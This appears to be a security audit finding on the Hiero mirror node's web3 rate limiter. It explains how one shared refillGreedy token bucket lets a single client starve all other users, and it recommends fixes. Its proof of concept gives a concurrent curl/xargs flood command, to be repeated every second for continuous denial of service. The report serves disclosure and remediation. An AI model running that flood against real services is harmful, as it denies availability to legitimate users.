### Title
Global Rate Limit Starvation via Burst Monopolization Using `refillGreedy` Token Bucket

### Summary
The `rateLimitBucket` in `ThrottleConfiguration.java` is a single JVM-wide singleton with no per-client isolation. Using bucket4j's `refillGreedy` strategy, the full 500-token capacity is available for immediate burst consumption. An unprivileged attacker can exhaust all 500 tokens in a single burst, causing every other concurrent user to receive HTTP 429 for the remainder of the refill window, repeatable every second indefinitely.

### Finding Description
**Exact code path:**

`web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`, `rateLimitBucket()`, lines 24–32:
```java
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default: 500
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))  // full burst allowed
            .build();
    return Bucket.builder().addLimit(limit).build(); // singleton, no per-IP isolation
}
```

`web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, line 38:
```java
if (!rateLimitBucket.tryConsume(1)) {  // no caller identity check
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
```

**Root cause:** Two compounding design flaws:
1. `refillGreedy` in bucket4j allows the full bucket capacity to be consumed in a single atomic burst — there is no sub-second token distribution or smoothing.
2. The bucket is a Spring singleton `@Bean` shared across all callers with zero per-IP, per-connection, or per-identity partitioning.

**Failed assumption:** The design assumes requests will arrive roughly uniformly across the second. In reality, a single attacker can issue all 500 requests simultaneously, draining the bucket to zero before any other user can consume a token.

**Why existing checks fail:** The only guard is `rateLimitBucket.tryConsume(1)` — a single global counter. There is no IP extraction, no per-client sub-bucket, no connection-level limit, and no burst-smoothing (`refillIntervally` is not used). The `RequestFilter` / `RequestProperties` system operates on contract call content fields (`FROM`, `DATA`, `TO`, etc.) — not on network identity — and is not configured by default (`request = List.of()`).

### Impact Explanation
An attacker with a single machine and 500 concurrent HTTP connections can:
- Drain the entire global token pool to zero in under 1 millisecond.
- Force every other legitimate user to receive HTTP 429 `"Requests per second rate limit exceeded"` for the remainder of that second (~999ms).
- Repeat this every second, achieving near-continuous denial of service for all other users.

The gas-limit bucket (`gasLimitBucket`) does not mitigate this because the rate-limit check (`rateLimitBucket.tryConsume(1)`) is evaluated first and short-circuits on failure. Severity: **High** — complete availability loss for all concurrent users, no authentication required, no resource cost to attacker beyond network connections.

### Likelihood Explanation
The attack requires no credentials, no special knowledge of the system, and no exploit tooling beyond a standard HTTP client capable of concurrent requests (e.g., `curl --parallel`, `ab`, `wrk`, Python `asyncio`). The 500-request burst is well within the capability of a single commodity machine. The attack is deterministic, repeatable every second, and leaves no persistent state to clean up. Any motivated actor wishing to disrupt the web3 JSON-RPC endpoint can execute this trivially.

### Recommendation
1. **Replace `refillGreedy` with `refillIntervally`** to distribute tokens evenly across the second (1 token per 2ms for 500/s), preventing full-burst consumption:
   ```java
   .refillIntervally(rateLimit, Duration.ofSeconds(1))
   ```
2. **Add per-IP rate limiting** using a `ConcurrentHashMap<String, Bucket>` keyed on the client IP extracted from `HttpServletRequest`, so each IP gets its own sub-bucket (e.g., 50 req/s per IP with a global cap of 500 req/s).
3. **Consider a two-tier limit**: a per-IP bucket (e.g., 50/s) enforced before the global bucket, so no single source can monopolize global capacity.
4. **Deploy an edge-layer rate limiter** (e.g., nginx `limit_req`, AWS WAF rate rules) as a defense-in-depth measure independent of application-layer controls.

### Proof of Concept
**Preconditions:** Web3 mirror node running with default config (`requestsPerSecond=500`), no external rate limiting.

**Step 1 — Attacker drains the bucket:**
```bash
# Send 500 concurrent requests at the same instant
seq 500 | xargs -P500 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST http://<target>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Expected: 500 x HTTP 200 (all tokens consumed)
```

**Step 2 — Legitimate user is denied:**
```bash
# Immediately after, any other user's request:
curl -X POST http://<target>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Expected: HTTP 429 "Requests per second rate limit exceeded"
```

**Step 3 — Repeat every second** to maintain continuous DoS. The `refillGreedy` bucket refills to 500 after ~1 second, allowing the attacker to drain it again immediately. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-42)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```
